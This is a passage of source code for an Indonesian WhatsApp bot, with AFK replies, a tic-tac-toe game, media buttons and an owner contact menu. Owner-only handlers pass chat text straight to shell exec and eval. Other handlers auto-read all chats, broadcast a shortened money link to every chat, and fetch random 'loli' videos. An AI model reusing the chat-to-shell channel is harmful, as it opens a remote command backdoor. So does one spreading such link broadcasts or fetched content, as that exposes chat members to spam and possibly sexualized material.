            Haikal.sendMessage(kal.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': Mthumb}}}})
            }
            }   
        if (kal.key.remoteJid.endsWith('@g.us') && offline) {
        if (!kal.key.fromMe){
        if (kal.message.extendedTextMessage != undefined){
        if (kal.message.extendedTextMessage.contextInfo != undefined){
        if (kal.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of kal.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(kal.key.remoteJid)) return
        addafk(kal.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        Haikal.sendMessage(kal.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': Mthumb}}}})
          }
        }
            }
          }
        }
      }
    }
//=================================================//    
if (budy.startsWith('$')){
if (!kal.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
    // Eval Async ( HW MODS WA  )
if (budy.startsWith('=>')){
if (!isOwner && !kal.key.fromMe) return
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return freply(bang)
}
try {
freply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
freply(String(e))
}
}
//=================================================//
// Auto Read Group ( HW MODS WA )
var chats = await Haikal.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await Haikal.chatRead(jid)
})
// Auto Read Private ( HW MODS WA )
var chatss = await Haikal.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await Haikal.chatRead(jid)
})
var prefi = pref
			
if (multi) {
    prefi = `Multi-Prefix`
}
//=================================================//
// function for get the winner
const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}
// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let _win = winawal - wn.win
                    if (_win <= 0) return Haikal.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${_win}`, text, { quoted: ikal })
                    return `${_win}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${_win}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let _lose = loseawal - ls.lose
                    if (_lose <= 0) return Haikal.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${_lose}`, text, { quoted: ikal })
                    return `${_lose}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${_lose}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
        return Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await freply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `\n\n•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `\n_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻\n\n`
                    teks += board
                    teks += `\n\n•> Win : @${player2} 🎉\n_fix tictactoe by HW MODS 2021_`
                    return Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉\n\n`
                    teks += board
                    teks += `\n\n•> Lose : @${player2} 👻\n_fix tictactoe by HW MODS 2021_`
                    return Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                teks += `•> Draw : @${player1} 🦁\n\n`
                teks += board
                teks += `\n\n•> Draw : @${player2} 🐯\n_fix tictactoe by HW MODS 2021_`
                return Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return freply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}\n`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `\n\n•> Player 2 : @${lawan.split("@")[0]} (${pelawan})\n_fix menactoe by HW MODS 2021_`
                return Haikal.sendMessage(from, tesk, text, {quoted:ikal, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Haikal.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: ikal, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}
//=================================================//
		// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !kal.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
//=================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message') 
//=================================================//               
                if (!isCmd && kal.message) {
             for (let i of totalchat) {
          Haikal.updatePresence(i.jid, Presence.recording)
                   }
             }        
//=================================================//             
	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!kal.key.fromMe && !isOwner && banChats === true) return		
		if (atibot === true) return
const isBtMsg = (type == 'buttonsResponseMessage') ? kal.message.buttonsResponseMessage.selectedDisplayText : ''
const isStMsg = (type == 'listResponseMessage') ? kal.message.listResponseMessage.title : ''
//=================================================//
switch (isBtMsg) {
case 'Lanjut':
       case 'Lolivideo':
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
case 'ASUPAN':
			Haikal.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Haikal.sendMessage(from, asupan, video, {quoted: ikal, caption: '```ASUPAN NIH:V```'})
				break        
case 'ASUPAN2':
			Haikal.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Haikal.sendMessage(from, asupan, video, {quoted: ikal, caption: '```ASUPAN NIH:V```'})
				break 				                                 
case 'SCBOT':
offline = false
bct(' https://duit.cc/AaPnL7 ')
break
case 'OWNER':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏ NOMOR OWNER :
┣❏ Wa.me/6285714170944
┗━━⊱
┏━━⊱
┣❏ INSTAGRAM :
┣❏ https://www.instagram.com/hikal_857/?hl=id
┗━━⊱
┏━━⊱
┣❏ YOUTUBE :
┣❏ https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g
┗━━⊱
┏━━⊱
┣❏ TELEGRAM :
┣❏ https://t.me/haikal857
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS AND SUPPORT -

©[XM] XHIRO MHONSHINE ✌️
©[GWI] GENERASI WAMOD INDONESIA
©[EGW] ERRORR GENERASI WHATSAPP

- Thanks Support -
- Hexagon
- Mhankbarbar
- Mans
- All Creator Bot

- Thanks You Bot -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
                   case 'CANTIK':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so cantik`, quoted: ikal})
                   break                                      
                   case 'KEREN':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so keren`, quoted: ikal})
                   break
                   case 'GANTENG':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so ganteng`, quoted: ikal})
                   break
}
//=================================================//
//switch Botton
switch (isStMsg) {
// Nomor owner
case 'QUOTES1':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AjLJYNsWTMEIB87vnNZ8FSqHwsWserMukUwHg_CwkbvM.enc",
						"mimetype": "video/mp4",
						"fileSha256": "z2h5/ldkqRNceMyyrhNsF5r3xQB7lGQfrA1Kq0IUFPM=",
						"fileLength": "1900342",
						"seconds": 13,
						"mediaKey": "W5KV5Ue7KbmRawTkChhdQhlq1qN+AI+zni0IMSicu+g=",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "AdXEUs7t64T8KUxH+MgJPg2EQ/5QTXlczfHyi4sE0jI=",
						"mediaKeyTimestamp": "1635684859",					
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES2':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApuZVsO_njJi9sGN_kQGaE9D_yVX6sGfuXuphY604bgA.enc",
						"mimetype": "video/mp4",
						"fileSha256": "cmeGEq0++qdersWh3kphOUD/htdLtIy4WA5QA8Pt6u0=",
						"fileLength": "707950",
						"seconds": 9,
						"mediaKey": "urXORMTE4a0QZM+HiDuIHFh66sT/8GcGWnq29t49DtI=",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "D3ymt5kP/goJfb2u8a94t2N4fB3piSPGoqPF7J0K76I=",
						"mediaKeyTimestamp": "1635685052",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES3':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ArpTp9mzODLuduKT7SphCzvbhJDDD2IFkCWcCF3Z5Zvn.enc",
						"mimetype": "video/mp4",
						"fileSha256": "voD5B2uSKrsztPPwr1qdEPPKhCpK8I2MgEIA+Tu0vBE=",
						"fileLength": "718085",
						"seconds": 12,
						"mediaKey": "aeaSGup/u2jgZwXHPtck3nsTS9tduylIqu5AREE1Ou4=",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "yjsKtqVchhDk7ICFUg/7CsvGT/AeArEjYIlhLj0VTQc=",
						"mediaKeyTimestamp": "1635685416",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES4':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AmFhLFFRrF_pyI7NLdg9ASBddTqXjD81_CJ8LzyU27El.enc",
						"mimetype": "video/mp4",
						"fileSha256": "qFAgtVEGC2GyHhft2N3EjApWUMOZ9x0mgw/mtgPt8nA=",
						"fileLength": "686787",
						"seconds": 16,
						"mediaKey": "uxPi4oYisjD71SqWYRTGwySNicmSGKV3fwzjkUBR8Wo=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "yqfURjZ8/5YfJhqu1XUMVy1C9Z3xQufYCPxhYAco2Ho=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES5':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Am50nFEWViHhiidXveqYkOsZNzQO4Rxr1LW6me_rCQcD.enc",
						"mimetype": "video/mp4",
						"fileSha256": "xaEM48/qClUkbsW0zJqIaFtFS5r/+pmXU7kJarxdf+c=",
						"fileLength": "1103453",
						"seconds": 8,
						"mediaKey": "UUehUrhac0y6gf/ZmiPyP2cVlcptrJSR4/EJ1Rr7B/c=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "T8C7XXGQsbs73+UZT/PoK5BQwIjwQFpVJGs2NkmjWDs=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES6':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Aoy9ynT8UG4nNAEsUdePSKkbz9ghs9oQPOMP36YzUGNj.enc",
						"mimetype": "video/mp4",
						"fileSha256": "BQXpYjIKK2v2ZSv/hGKJN1waOgyI2iS/mylYs8FbW9g=",
						"fileLength": "763821",
						"seconds": 15,
						"mediaKey": "imLIRmwR/65qEmUbdUp00hk9iPDiUEFOhV32sPMHuhI=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "R5hH1ApqMk8zOrexJuzvI+C9whDVxrZw7eOqdlNVOlI=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES7':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Asqb1bBaoOAn0RZobE9k1sQKQiH_8xCKwb35w6JipTcU.enc",
						"mimetype": "video/mp4",
						"fileSha256": "YPdvwvK7Q6vIJB6Me0jIJ3XKJdWVdrNGDmxsQKXMPCA=",
						"fileLength": "675845",
						"seconds": 7,
						"mediaKey": "W4ctSQzA7cJnWv97PGVo/yLCaR1J9u0jLjEpomX5g7Y=",
						"caption": "Done!",
						"height": 1056,
						"width": 576,
						"fileEncSha256": "Zk+I9VU7D0g/P8owFF6eAq31eItiR/ksCSkBXZstvss=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES8':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AsKU9tP9D2q79vwnTwByXyEGuzvdolHiSPF3kNi-jHu5.enc",
						"mimetype": "video/mp4",
						"fileSha256": "PHwa1clsNigNqUNCFqjYoG+Qo6oeUgJ2nPJh4xvEsaE=",
						"fileLength": "788356",
						"seconds": 10,
						"mediaKey": "OT2KDF5xcpL4zrU1bugg7oZo0yMiV/+mf54esIjpM3w=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "O7r9nIO5xgomi2C9ut+6lkyUGDuDdqQZ6y1RVgN6aUQ=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES9':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Aq52q3NOiDdvJhlOyjKd4yg-M6TI7IoVJ-3r2g5EAndo.enc",
						"mimetype": "video/mp4",
						"fileSha256": "BPXWkd4RygtJOHVn1LkRedu62a0gYAbewgcAHkmbMTA=",
						"fileLength": "673464",
						"seconds": 12,
						"mediaKey": "sUjLd1Q9376KbOGAQqm/BuDGA464ypybvkJbG+uS/M4=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "g3AGKySxFZmq8ceH9QegovAR2cLEJ34bcvcEdkxFl8s=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'QUOTES10':
                    if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtnLNg2RIILQzZ5-Uu5Kb7EzgVQ9kc0EKCoOG8Jn-8Va.enc",
						"mimetype": "video/mp4",
						"fileSha256": "xcmCRMlQ43S1sNbj+Z083JH1abKIEIU1X6iMxQDPKrQ=",
						"fileLength": "384567",
						"seconds": 7,
						"mediaKey": "c7oJ5+5N5qx7F78gEoGHOXax6UTkDQTSam3Mo2tLoos=",
						"caption": "Done!",
						"height": 1024,
						"width": 576,
						"fileEncSha256": "WFuikRYZZ2RVvRe6P8mGeUoUClLeSYd7FSclPy9a150=",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
                    break
case 'owner':
case 'admin':
case 'creator':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏ NOMOR OWNER :
┣❏ Wa.me/6285714170944
┗━━⊱
┏━━⊱
┣❏ INSTAGRAM :
┣❏ https://www.instagram.com/hikal_857/?hl=id
┗━━⊱
┏━━⊱
┣❏ YOUTUBE :
┣❏ https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g
┗━━⊱
┏━━⊱
┣❏ TELEGRAM :
┣❏ https://t.me/haikal857
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS AND SUPPORT -

©[XM] XHIRO MHONSHINE ✌️
©[GWI] GENERASI WAMOD INDONESIA
©[EGW] ERRORR GENERASI WHATSAPP

- Thanks Support -
- Hexagon
- Mhankbarbar
- Mans
- All Creator Bot

- Thanks You Bot -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
